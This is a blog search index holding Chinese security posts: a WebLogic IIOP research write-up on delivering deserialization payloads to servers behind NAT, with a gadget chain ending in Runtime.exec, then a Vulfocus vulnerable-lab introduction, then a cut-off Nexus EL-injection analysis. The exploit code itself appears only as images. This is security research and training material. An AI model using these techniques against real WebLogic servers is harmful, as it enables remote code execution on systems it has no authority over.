<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Weblogic IIOP 协议NAT 网络绕过</title>
      <link href="/posts/144eb4b6/"/>
      <url>/posts/144eb4b6/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>通常在渗透的过程中会遇到很多 Weblogic 服务器，但通过 IIOP 协议进行发送序列化恶意代码包时，会面临着无法建立通讯请求发送恶意序列化失败。最近参与了一场在成都举办的《FreeTalk 2020 成都站》，有幸分享了关于 Weblogic IIOP 协议 NAT 绕过的几种方式。</p><p>PPT 下载地址：<a href="https://img.zhiiyun.com/Weblogic_IIOP_NAT.pptx" target="_blank" rel="noopener">《Weblogic IIOP 协议NAT 网络绕过》</a></p><h2 id="成果演示"><a href="#成果演示" class="headerlink" title="成果演示"></a>成果演示</h2><p>Goby  工具中关于 Weblogic 基本都是用了 IIOP 协议绕过的方案，比较有代表性的漏洞为 CVE-2020-2551 漏洞。</p><p><img src="https://img.zhiiyun.com/blog_f9a0b8ae6c2c0a53575d81a9c2efd0f4" alt=""></p><p>内部工具 <code>weblogic-framework</code> 使用了多项核心技术来进行优雅的测试 Weblogic，其中也使用了 IIOP 协议的绕过方案。</p><p><img src="https://img.zhiiyun.com/blog_5cde992ba70cb89c6106681e4c3fad88" alt=""></p><h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>在开始之前，非常有比较提及一下以下这些协议相关的内容：</p><ul><li><p>RMI：​ 远程方法调用，本质上是 RPC 服务的 JAVA 实现，底层实现是 JRMP 协议，主要场景是分布式系统。</p></li><li><p>CORBA：跨语言（C ++、Java等）的通信体系结构，通常在 IIOP 协议中使用。</p></li><li><p>GIOP：主要提供标准的传输语法以及 ORB 通信的信息格式标准。</p></li><li><p>IIOP：CORBA 对象之间交流的协议，GIOP 的实现。</p></li><li><p>RMI-IIOP：解决 RMI 和 CORBA/IIOP 无法同时使用的技术方案。</p></li><li><p>Weblogic IIOP：Weblogic 自实现的 RMI-IIOP。</p></li><li><p>T3：WebLogic Server 中的 RMI 通信使用 T3 协议传输 WebLogic Server 和其他 Java 程序，包括客户端及其他 WebLogic Server 实例之间 数据。</p></li></ul><p>T3 协议本质上 RMI 中传输数据使用的协议，但通过上面我们看到 RMI-IIOP 是可以兼容 RMI 和 IIOP 的，所以在 Weblogic 中只要可以通过 T3 序列化恶意代码的都可以通过 IIOP 协议进行序列化，正是因为这种情况，我进入 Weblogic 第三季度深度贡献者名单。</p><p><img src="https://img.zhiiyun.com/blog_81f97b9fad17cb59595f3dd18e73c489" alt=""></p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="IIOP-序列化攻击流程"><a href="#IIOP-序列化攻击流程" class="headerlink" title="IIOP 序列化攻击流程"></a>IIOP 序列化攻击流程</h3><p><img src="https://img.zhiiyun.com/blog_2434fdee367e541e79ff8fa9c557ed68" alt=""></p><p>一般 IIOP 序列化攻击的大致流程主要为首先构建恶意序列化代码，然后初始化上下文实例，最后通过 <code>bind/rebind</code> 进行发送恶意序列化代码，下图为关键代码。</p><p><img src="https://img.zhiiyun.com/blog_8a7fb81c0b6a8f3c94033c56123912cb" alt=""></p><h3 id="IIOP-初始化上下文流程"><a href="#IIOP-初始化上下文流程" class="headerlink" title="IIOP 初始化上下文流程"></a>IIOP 初始化上下文流程</h3><p>初始化上下文通过攻击流程中的 <code>new InitialContext(env)</code> 进行构建，最终的入口点通过 <code>getInitialContext</code> 方法进行构建，最终是进行流入到 <code>InitialContextFactoryImpl.getInitialContext</code> 进行初始化上下文。</p><p><img src="https://img.zhiiyun.com/blog_b773a1b56d0bea105dbad0f3676cba6c" alt=""></p><p>在流入 <code>InitialContextFactoryImpl.getInitialContext</code> 之后会通过 <code>obj = ORBHelper.getORBHelper().getORBReference</code> 来进行获取 <code>NameService</code>，然后将获取到的 <code>NameService</code> 进行实例化创建上下文实例，提供后续的执行操作。</p><p><img src="https://img.zhiiyun.com/blog_1384f6e9fa4b8a40f7a55a7692f8e12d" alt=""></p><h3 id="rebind-流程"><a href="#rebind-流程" class="headerlink" title="rebind 流程"></a>rebind 流程</h3><p>执行 <code>rebind</code> 流程中，首先会通过 <code>this.getContext</code> 方法进行获取前面所讲的上下对象，然后通过 <code>rebind_any</code> 进行发发送序列化代码，当前在此之前已经通过经过序列化的了。</p><p><img src="https://img.zhiiyun.com/blog_aaf2e6a0e456452b88fe111a616703c6" alt=""></p><p>在 <code>rebind_any</code> 中，首先会通过 <code>this._request</code> 进行发送 <code>rebind_any</code> 建立 Socket 通讯，最后通过 <code>this._invoke</code> 方法进行执行最终的操作发送序列化代码。</p><p><img src="https://img.zhiiyun.com/blog_107c58a0ca196a45dca9ccdbea1c13fc" alt=""></p><h3 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h3><p>所以最终大致的执行流程是如下图，获取 <code>NameService</code>，基于获取的信息进行创建上下文实例（获取实际连接信息），然后进行发起 <code>request</code> 请求，最后进行执行 <code>rebind_any</code> 操作。</p><p><img src="https://img.zhiiyun.com/blog_5fc3d39201562d32722a5c2bd9d1a436" alt=""></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li>Weblogic：12.1.3.0</li><li>协议：IIOP</li><li>漏洞编号：CVE-2020-2555</li><li>内网（Windows）：<a href="http://10.10.10.173:7001" target="_blank" rel="noopener">http://10.10.10.173:7001</a></li><li>NAT 网络（ vulfocus ） ： <a href="http://118.193.36.37:32769/" target="_blank" rel="noopener">http://118.193.36.37:32769/</a>  内部 IP： 172.17.0.5</li></ul><p>NAT 网络构建通过 <code>http://vulfocus.fofa.so/</code> 进行搭建构造。</p><p><img src="https://img.zhiiyun.com/blog_cd984ac2669dd1025f5563d3c67c14dd" alt=""></p><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>在后续的调试以及研究中我们所使用的版本为 12.1.3.0 版本，漏洞为 CVE-2020-2555 漏洞，以下为漏洞 POC，以及漏洞执行链，在这里不多讲该漏洞，有兴趣的可以移步<a href="https://www.r4v3zn.com/posts/975312a1/">漫谈 Weblogic CVE-2020-2555</a>。</p><p><img src="https://img.zhiiyun.com/blog_1e4b4e6542ff03eef30ae7d6973efd64" alt=""></p><p>执行链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    BadAttributeValueExpException.readObject()</span><br><span class="line">        LimitFilter.toString()</span><br><span class="line">            ChainedExtractor.extract()</span><br><span class="line">                ReflectionExtractor.extract()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Class.getMethod()</span><br><span class="line">                ReflectionExtractor.extract()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.getRuntime()</span><br><span class="line">                ReflectionExtractor.extract()</span><br><span class="line">                    Method.invoke()</span><br><span class="line">                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>当我们可以与 Weblogic 所处同一网段并且可达的时，可以看到是成功执行系统命令弹出计算器。</p><p><img src="https://img.zhiiyun.com/blog_d46df84a0424809fe9211538eff2202c" alt=""></p><p>通过 Wireshark 进行抓包可以，可以看到一共通讯了 2 次，第一次发送 <code>LocateRequest</code> 类型的 <code>LocateRequest</code> 的通讯操作获取 <code>NameService</code>，第二次发送 <code>Request</code> 类型的 <code>rebind_any</code> 操作进行发送序列化代码。</p><p><img src="https://img.zhiiyun.com/blog_0d68bd61f6da9cdf907bea14f00acf3e" alt=""></p><p>而进行测试公网中的靶机时抛出 <code>Operation time out</code> 异常，具体信息如下图。</p><p><img src="https://img.zhiiyun.com/blog_769ba7b20feef06758a87cce327a4777" alt=""></p><p>而在 Wireshark 中可以看到，与第一次获取<code>NameService</code>中的内网 IP、端口进行了 Socket 通信。</p><p><img src="https://img.zhiiyun.com/blog_9985971f686486e53cea3c24304462c6" alt=""></p><p>而在执行的流程中停留在了 <code>createEndPoint</code> 方法中，所以通信问题大概率是在此方法中引发的。</p><p><img src="https://img.zhiiyun.com/blog_9a401afc46959ebafed9061ee540e423" alt=""></p><p>在 <code>createEndPoint</code> 方法中，最后通过 <code>MuxableSocketIIOP.createConnection</code> 方法进行建立 Socket 通信，此时的通信变为了 Weblogic 运行的内网 IP 和端口。</p><p><img src="https://img.zhiiyun.com/blog_2e4459b1a0781d9a9d2477804db549fc" alt=""></p><p>所以大体的情况为如下图，问题出现在发起 <code>request</code> 时调用的 <code>createEndPoint</code> 方法中，由于 <code>createEndPoint</code> 无法正常建立 Socket 通信导致后续的操作无法正常秩序。</p><p><img src="https://img.zhiiyun.com/blog_462206123307b6783390c0e5d4c0ffa6" alt=""></p><p>其实，我们也可以在 Weblogic 启动日志中也可以看到 Weblogic 关于端口和协议分配的情况，基本分配都是内网网卡的IP和端口同时会进行监听 <code>0.0.0.0:7001</code> 来处理协议的请求操作，那么现在问题来了，公网中的 Weblogic 服务器 99% 分配的都是内网 IP 和端口。</p><h2 id="IIOP-NAT-绕过方案"><a href="#IIOP-NAT-绕过方案" class="headerlink" title="IIOP NAT 绕过方案"></a>IIOP NAT 绕过方案</h2><p>由于问题发生在响应的 Weblogic 在获取 NameService 时，响应的 IP和端口为内网中的端口，导致在后续 <code>createEndPoint</code> 建立 Socket 通信，所以我们可以进行在建立 Socket 通信之前修改为正确的 IP和端口（公网中的IP和端口）。</p><p><img src="https://img.zhiiyun.com/blog_ce89e265e6e4fb1f352aca6fbb891ae6" alt=""></p><h3 id="GIOP-协议极简实现"><a href="#GIOP-协议极简实现" class="headerlink" title="GIOP 协议极简实现"></a>GIOP 协议极简实现</h3><p>当我们与服务器所处同一网段时，可以看到一共通讯了 2 次，第一次发送 <code>LocateRequest</code> 类型的 <code>LocateRequest</code> 的通讯操作获取 <code>NameService</code>，第二次发送 <code>Request</code> 类型的 <code>rebind_any</code> 操作进行发送序列化代码。</p><p><img src="https://img.zhiiyun.com/blog_36b6f5b4c07c96ecaccb198abdfb417a" alt=""></p><p>所以我们根据 Wireshark 中的信息，可以进行构建极简的 GIOP 实现，大体如下：</p><ol><li>请求 LocateRequest，获取 NameService 以及获取 key</li><li>请求 Request，执行 rebind_any 操作，发送序列化代码</li></ol><h4 id="GIOP-协议"><a href="#GIOP-协议" class="headerlink" title="GIOP 协议"></a>GIOP 协议</h4><p>GIOP 协议大致由 Header 和 Message Type 进行构成，在 Header 包含了 Magic、Version、Message Type、Message Size。</p><p><img src="https://img.zhiiyun.com/blog_4ccac63d8b1b0eba1168ff640e17e54f" alt=""></p><p>Message Type 的类型如下：</p><table><thead><tr><th style="text-align:center">消息类型</th><th style="text-align:center">始发方</th></tr></thead><tbody><tr><td style="text-align:center">Request</td><td style="text-align:center">Client</td></tr><tr><td style="text-align:center">Request</td><td style="text-align:center">Server</td></tr><tr><td style="text-align:center">CancelRequest</td><td style="text-align:center">Client</td></tr><tr><td style="text-align:center">LocateRequest</td><td style="text-align:center">Client</td></tr><tr><td style="text-align:center">LocateReply</td><td style="text-align:center">Server</td></tr><tr><td style="text-align:center">CloseConnection</td><td style="text-align:center">Server</td></tr><tr><td style="text-align:center">MessageError</td><td style="text-align:center">Both</td></tr><tr><td style="text-align:center">Fragment</td><td style="text-align:center">Both</td></tr></tbody></table><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p><img src="https://img.zhiiyun.com/blog_81256145edd7fc6453a6d8cfe1085705" alt=""></p><p>获取 NameService 请求代码实现：</p><p><img src="https://img.zhiiyun.com/blog_d385e7ccf33a6b872f5662b09f70568d" alt=""></p><p>执行 rebind_any 操作代码实现：</p><p><img src="https://img.zhiiyun.com/blog_92cc2d6cf84590a9b4fa706d62105bd8" alt=""></p><p>最终效果：</p><p><img src="https://img.zhiiyun.com/blog_9c1e9fdd06a3a58b280a4f416154b0be" alt=""></p><h3 id="Javassist-字节码库"><a href="#Javassist-字节码库" class="headerlink" title="Javassist 字节码库"></a>Javassist 字节码库</h3><p>Javassist (JAVA programming ASSISTant) 是在 Java 中编辑字节码的类库，它使 Java 程序能够在运行时定义一个新类，并在 JVM 加载时修改类文件。</p><ul><li>Javassist.CtClass 是类文件的抽象表示形式</li><li>Javassist.CtMethod 是类方法的抽象表示形式</li></ul><p>读取类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault(); </span><br><span class="line">CtClass cc = pool.get(&quot;test.Rectangle&quot;);</span><br></pre></td></tr></table></figure><p>创建类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ClassPool pool = ClassPool.getDefault(); </span><br><span class="line">CtClass cc = pool.makeClass(&quot;Point&quot;);</span><br></pre></td></tr></table></figure><p>继承</p><p><code>cc.setSuperclass(pool.get(&quot;test.Point&quot;));</code></p><p>写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cc.writeFile();</span><br><span class="line">cc.toClass();</span><br></pre></td></tr></table></figure><p>需要注意的是 <code>toClass()</code> 会把当前修改的 Class 加入到当前的 <code>ClassLoader</code> 中。</p><p>创建方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault(); </span><br><span class="line">CtClass cc = pool.makeClass(&quot;Point&quot;);</span><br><span class="line">CtMethod ctMethod = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, cc);</span><br></pre></td></tr></table></figure></p><p>修改方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CtMethod ctMethod = ctClass.getDeclaredMethod(&quot;hello&quot;);</span><br><span class="line">ctMethod.setBody(&quot;System.out.println(\&quot;set body\&quot;);&quot;);</span><br><span class="line">ctMethod.insertBefore(&quot;System.out.println(\&quot;set before\&quot;);&quot;);</span><br><span class="line">ctMethod.insertAfter(&quot;System.out.println(\&quot;set after\&quot;);&quot;);</span><br></pre></td></tr></table></figure></p><p>通过 Javassist 进行实现时，可以通过修改建立 Socket 通信之前的方法，将 ip、端口替换为正常的 IP 和端口，在这里选取的是 <code>newSocket</code> 方法，在第一个参数为 <code>host</code>，第二个参数为 <code>port</code>。</p><p><img src="https://img.zhiiyun.com/blog_9ec2b7d5fa5b02bdab4bad3501de4c8d" alt=""></p><p>最终修改的如下图：</p><p><img src="https://img.zhiiyun.com/blog_73a6947e835969604559bbb5efd92f8b" alt=""></p><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><p>在实现的过程中，仅需要在执行到 <code>newSocket</code> 方法时，将连接到 IP 和端口设置为正确的 IP 和 端口，核心代码如下图：</p><p><img src="https://img.zhiiyun.com/blog_f377e95a1aeea487b7fc70846a7a1de6" alt=""></p><p>最终效果：</p><p><img src="https://img.zhiiyun.com/blog_d341a979e60f53ec95538a5b44552169" alt=""></p><h3 id="源代码修改"><a href="#源代码修改" class="headerlink" title="源代码修改"></a>源代码修改</h3><p><img src="https://img.zhiiyun.com/blog_6361fd46bb5c667f3c63970bf2b2c127" alt=""></p><p>在执行的流程中最终执行到了 <code>createEndPoint</code> 方法中，从执行流程来看主要如下图所示。</p><p><img src="https://img.zhiiyun.com/blog_ba6fbbcdd0b408b16d1940faf923241e" alt=""></p><p>在执行 <code>rebind</code> 方法发送序列化代码时，可以看到在此时已经变成了 Weblogic 内网中运行的 IP 和 端口，直到程序执行到 <code>createEndPoint</code> 抛出异常。</p><p><img src="https://img.zhiiyun.com/blog_68e2cdf372d6bd00cc203649f2b04ff1" alt=""></p><p>而执行到 <code>getInvocationIOR</code> 方法时，会调用 <code>IIOPRemoteRef.locateIORForRequest</code> 方法来进行寻找 <code>IOR</code>，并且将寻找到的 <code>IOR</code> 设置为当作当前 <code>IOR</code> 进行返回提供使用。</p><p><img src="https://img.zhiiyun.com/blog_91e5262ec571dd744a9f10856de5c564" alt=""></p><p>在进入 <code>locateIORForRequest</code> 方法之后会通过 <code>EndPointManager.findOrCreateEndPoint</code> 来进行寻找或创建结束切点，可以看到此时 <code>IOR</code> 的 <code>host</code>、<code>port</code> 变成了内网中的 IP 和端口。 </p><p><img src="https://img.zhiiyun.com/blog_737484703cca2fb90dae88ee20ad6b46" alt=""></p><p>在进入 <code>EndPointManager.findOrCreateEndPoint</code> 最终会执行到 <code>createEndPoint</code> 方法中来进行建立 Socket 通信，在这里由于是内网的 IP 和端口无法成功建立通信，导致后续的利用也无法继续进行。</p><p><img src="https://img.zhiiyun.com/blog_b8be6dfae587544de34ac7d46e228750" alt=""></p><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><p>大致的问题点已经确认的清楚的情况下，我们可以通过修改原始代码的方式来进行实现绕过，大体思路为：</p><ol><li>修改 <code>weblogic.corba.j2ee.naming.ContextImpl</code> 类中的 <code>rebind</code> 方法</li><li>修改 <code>weblogic.iiop.IIOPRemoteRef</code> 类中 <code>locateIORForRequest</code> 方法的 ior 参数，确保正常调用 <code>findOrCreateEndPoint</code>  创建结束切点</li></ol><p>首先修改 <code>weblogic.corba.j2ee.naming.ContextImpl</code> 类中 <code>rebind</code> 方法将正确的连接 IP 和端口加入到系统环境变量中。</p><p><img src="https://img.zhiiyun.com/blog_50ce3f44885fe18c85247fcad5a3deb4" alt=""></p><p>最后在 <code>locateIORForRequest</code> 方法读取系统环境变量中正确的 IP 和端口并且修改 <code>ior</code> 变量中相关的连接信息。使之能够正常的执行 <code>findOrCreatePoint</code> 方法创建结束切点</p><p><img src="https://img.zhiiyun.com/blog_25d0789a9fd5906b2b720eab97b8fa0f" alt=""></p><p>最终效果：</p><p><img src="https://img.zhiiyun.com/blog_7e41dc916766e530fd2163b14a18685a" alt=""></p><h2 id="IIOP-NAT-绕过方案总结"><a href="#IIOP-NAT-绕过方案总结" class="headerlink" title="IIOP NAT 绕过方案总结"></a>IIOP NAT 绕过方案总结</h2><ul><li>GIOP 协议极简实现<ul><li>优点：原始 Socket 发包，效率较快</li><li>缺点：构造难度较高，需要掌握协议相关知识</li></ul></li><li>Javassist<ul><li>优点：修改难度较低</li><li>缺点：程序使用完毕之后需要重启，如果使用动态加载等方案可能导致资源占用率过高</li></ul></li><li>源代码修改<ul><li>优点：原生代码兼容性较强</li><li>缺点：修改难度较大</li></ul></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.csdn.net/weixin_33913377/article/details/94134763" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33913377/article/details/94134763</a></li><li><a href="https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf" target="_blank" rel="noopener">https://docs.oracle.com/cd/E13211_01/wle/wle42/corba/giop.pdf</a></li><li><a href="https://www.slideserve.com/milek/13-giop-iiop-ior" target="_blank" rel="noopener">https://www.slideserve.com/milek/13-giop-iiop-ior</a></li><li><a href="https://www.cnblogs.com/scy251147/p/11100961.html" target="_blank" rel="noopener">https://www.cnblogs.com/scy251147/p/11100961.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> weblogic </tag>
            
            <tag> t3 </tag>
            
            <tag> iiop </tag>
            
            <tag> giop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打“怪”升级的靶场——Vulfocus</title>
      <link href="/posts/b63356d0/"/>
      <url>/posts/b63356d0/</url>
      
        <content type="html"><![CDATA[<p>Vulfocus 是一个漏洞集成平台，将漏洞环境 docker 镜像，放入即可使用，开箱即用。</p><p>在线演示：<a href="http://vulfocus.fofa.so/" target="_blank" rel="noopener">http://vulfocus.fofa.so/</a></p><p>开源地址：<a href="https://github.com/fofapro/vulfocus" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus</a></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>漏洞靶场是目前每个安全人员以及想学习信息安全的人必备的东西，但目前商业化产品居多，还有一些类似 dvwa、 sqli-labs 这类的开源项目，但是漏洞环境比较固定，使用完一次后就失去其作用。搭建的成本过高，每次启动的流程会比较繁琐，甚至很多场景是不满足的，之前关于漏洞环境镜像使用多的是 vulhub，但是作为企业、高校等以及相关的培训，单纯的漏洞环境不一定能满足使用的需求，所以我们基于当下的一些靶场项目做出了小小的改进来符合我们的一些需求，比如增加 flag 的形式，来满足一些考核与验证的需求，可以对我们内部人员能力进行考核，于是 Vulfocus 就诞生了。</p><h2 id="认识-Vulfocus"><a href="#认识-Vulfocus" class="headerlink" title="认识 Vulfocus"></a>认识 Vulfocus</h2><p>因为 Vulfocus 一个漏洞集成平台，所以可以无限向里添加漏洞环境没有限制，前提是你的内存足够大。因为漏洞环境是docker镜像的原因每次重新启动漏洞环境都会还原，不用出现你会对环境造成破坏下次无法启动的现象。</p><p>Vulfocus 的 docker 仓库 <a href="https://hub.docker.com/u/vulfocus" target="_blank" rel="noopener">https://hub.docker.com/u/vulfocus</a></p><h3 id="Vulfocus的特性"><a href="#Vulfocus的特性" class="headerlink" title="Vulfocus的特性"></a>Vulfocus的特性</h3><ol><li>启动：一键漏洞环境启动，方便简单。</li><li>自带 Flag 功能：每次启动 flag 都会自动更新，明确漏洞是否利用成功。</li><li>带有计分功能也可适用于相关安全人员能力的考核。</li><li>兼容 <a href="https://vulhub.org/" target="_blank" rel="noopener">Vulhub</a>、<a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">Vulapps</a> 中所有漏洞镜像。</li></ol><h2 id="⬇️-下载及安装"><a href="#⬇️-下载及安装" class="headerlink" title="⬇️ 下载及安装"></a>⬇️ 下载及安装</h2><p>🏠 请参考 <a href="https://github.com/fofapro/vulfocus/blob/master/INSTALL.md" target="_blank" rel="noopener">INSTALL.md</a> 进行安装。</p><p>⬇️ 发行版下载 <a href="https://github.com/fofapro/vulfocus/releases" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus/releases</a>。</p><h3 id="✨-使用"><a href="#✨-使用" class="headerlink" title="✨ 使用"></a>✨ 使用</h3><p><img src="https://img.zhiiyun.com/blog_d4e074d30450fb086df48edab2d239c1" alt=""></p><ol><li><p>安装完成后，访问80端口</p></li><li><p>用设置好的管理员账户登录</p></li><li><p>首页为漏洞集成页面，刚开始是没有漏洞镜像的需要从 <a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a> 网站拉取镜像，或自己以tar包的形式上传。</p><p>漏洞镜像的拉取和上传（<strong>需管理员权限</strong>）：</p><p>(1)、在进行管理中，添加功能</p></li></ol><p><img src="https://img.zhiiyun.com/blog_f3c1e39d7bfcfeb7579b827ad8e3f51e" alt=""></p><p><img src="https://img.zhiiyun.com/blog_e77038bb1bd20168265bb52345105204" alt=""></p><p>   (2)、分别填入漏洞名称、镜像、rank、描述</p><ul><li>镜像又分为文件和文本<ul><li>文本：是从 <a href="https://hub.docker.com/u/vulfocus" target="_blank" rel="noopener">https://hub.docker.com/u/vulfocus</a> 官网拉取镜像。内容为如： <code>vulfocus/webmin-cve_2019_15107</code> 。 </li><li>文件：本地漏洞镜像打成tar包的形式进行上传。</li></ul></li></ul><ol start="4"><li>下载完成后点击启动即可。</li></ol><p><img src="https://img.zhiiyun.com/blog_441411c5d117b691ca3ab06caf993ca7" alt=""></p><ol start="5"><li>镜像启动后，会在环境里写入一个 flag （默认 flag 会写入 <strong>/tmp/</strong> 下），读取到 flag 后填入 flag 窗口，镜像会自动关闭，如需重新启动，需强刷一下，然后再次点击启动即可。</li></ol><h2 id="🛠贡献漏洞镜像"><a href="#🛠贡献漏洞镜像" class="headerlink" title="🛠贡献漏洞镜像"></a>🛠贡献漏洞镜像</h2><p>初期 Vulfocus 的漏洞镜像会较少，可能无法满足你的需求，所以非常期望大家来一起维护 Vulfocus，当你发现你的一些漏洞环境在 Vulfocus 中找不到时，可以提交供大家使用。一个有问题的环境可能会影响到使用者的情绪。因此我们对社区提交的漏洞环境会进行审核。贡献者在提交漏洞环境的时候，可提供相应的复现工具或流程，加速环境的审核。</p><h3 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h3><ul><li>提交 dockerfile</li><li>也可以上传到 <a href="https://hub.docker.com" target="_blank" rel="noopener">https://hub.docker.com</a> ，把镜像的名称提供给我们，镜像名称的命令规则如：框架（CMS、组件）-漏洞编号，例如：<code>vulfocus/spring-cve_2017_8046</code></li></ul><ul><li>例：<br>  vulfocus/webmin-cve_2019_15107<br>  vulfocus/spring-cve_2017_8046</li></ul><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><ul><li><p>fork <a href="https://github.com/fofapro/vulfocus" target="_blank" rel="noopener">vulfocus</a> 至个人项目，然后 clone 项目。</p></li><li><p>提交 dockerfile 至 <a href="https://github.com/fofapro/vulfocus/tree/master/images" target="_blank" rel="noopener">images</a> 文件夹中创建漏洞名称，然后将 dockerfile 放置该目录下，最后将环境信息提交至 <a href="https://github.com/fofapro/vulfocus/blob/master/images/README.md" target="_blank" rel="noopener"><code>images/README.md</code></a>。</p></li><li>贡献者以 PR 的方式向 github Vulfocus 社区仓库内提交 漏洞环境， 提交位置: <a href="https://github.com/fofapro/vulfocus/dockerfile/" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus/dockerfile/</a></li><li>我们会根据提供的 dockerfile，确定镜像环境是否可用。</li><li>审核完成后镜像会放进 <a href="https://hub.docker.com/u/vulfocus" target="_blank" rel="noopener">https://hub.docker.com/u/vulfocus</a> 仓库供大家使用。</li></ul><h2 id="📝-讨论区"><a href="#📝-讨论区" class="headerlink" title="📝 讨论区"></a>📝 讨论区</h2><p>如有问题可以在 GitHub 提 issue, 也可在下方的讨论组里</p><p>GitHub issue: <a href="https://github.com/fofapro/vulfocus/issues" target="_blank" rel="noopener">https://github.com/fofapro/vulfocus/issues</a></p><p>微信群: 通过扫描以下二维码加入并且备注 <code>申请 Vulfocus</code> 加入 Vulfocus 官方微信群。</p><p><img src="https://img.zhiiyun.com/blog_044fa7c0dae09ab2d304df63330fd195" alt=""></p><h2 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h2><ul><li><a href="https://github.com/PanJiaChen/vue-element-admin" target="_blank" rel="noopener">Vue Element Admin</a></li><li><a href="https://vulhub.org/" target="_blank" rel="noopener">Vulhub</a></li></ul><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>该项目会收集了当下比较流行的漏洞环境，若有侵权，请联系我们！</p><h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>镜像启动后立即访问地址失败？</p><ol><li>根据镜像的大小，启动时间会有不同的延迟，一般在几秒以内。</li></ol><p>提交完 flag 后会有卡住？</p><ol><li>在提交完正确flag后，会进行镜像关闭的动作，所以会有几秒的延迟。</li></ol><p>拉取镜像时一直卡在哪里</p><ol><li><p>由于网络延迟或镜像太大的原因时间会长一点。</p></li><li><p>镜像名称填错，也会卡在哪里，建议强刷一下。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulfocus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nexus Repository Manager 漏洞分析</title>
      <link href="/posts/f11ab8f9/"/>
      <url>/posts/f11ab8f9/</url>
      
        <content type="html"><![CDATA[<p>author：r4v3zn@白帽汇安全研究院</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>3 月 31 日 Nexus Repository Manager 官方发布了 <code>CVE-2020-10199</code> <code>CVE-2020-10204</code>  的漏洞通告信息，两个漏洞均是由 <a href="https://securitylab.github.com/" target="_blank" rel="noopener">Github Secutiry Lab</a> 的是 <a href="https://github.com/pwntester" target="_blank" rel="noopener">@pwntester</a> 发现的。</p><p>Nexus Repository 是一个开源的仓库管理系统，在安装、配置、使用简单的基础上提供了更加丰富的功能。</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p><code>CVE-2020-10199</code> 和 <code>CVE-2020-10204</code> 主要是由于可执行恶意 <code>EL表达式</code> 导致的。 </p><h3 id="CVE-2020-10199"><a href="#CVE-2020-10199" class="headerlink" title="CVE-2020-10199"></a>CVE-2020-10199</h3><p>该漏洞的最终触发是通过给 <code>HelperBean</code> 的 <code>message</code> 进行 <code>EL表达式</code> 注入。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Nexus Repository Manager 3.x OSS / Pro &lt;= 3.21.1</p><h3 id="CVE-2020-10204"><a href="#CVE-2020-10204" class="headerlink" title="CVE-2020-10204"></a>CVE-2020-10204</h3><p>漏洞触发的主要原因是在<br><code>org.sonatype.nexus.security.privilege.PrivilegesExistValidator</code> 或 <code>org.sonatype.nexus.security.role.RolesExistValidator</code> 类中，会对不存在的 <code>privilege</code> 或 <code>role</code> 抛出错误，而在错误信息抛出的时候，会存在一个 <code>EL表达式</code> 的渲染，会提取其中的el表达式并执行，从而造成 <code>EL表达式</code> 注入。</p><h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" 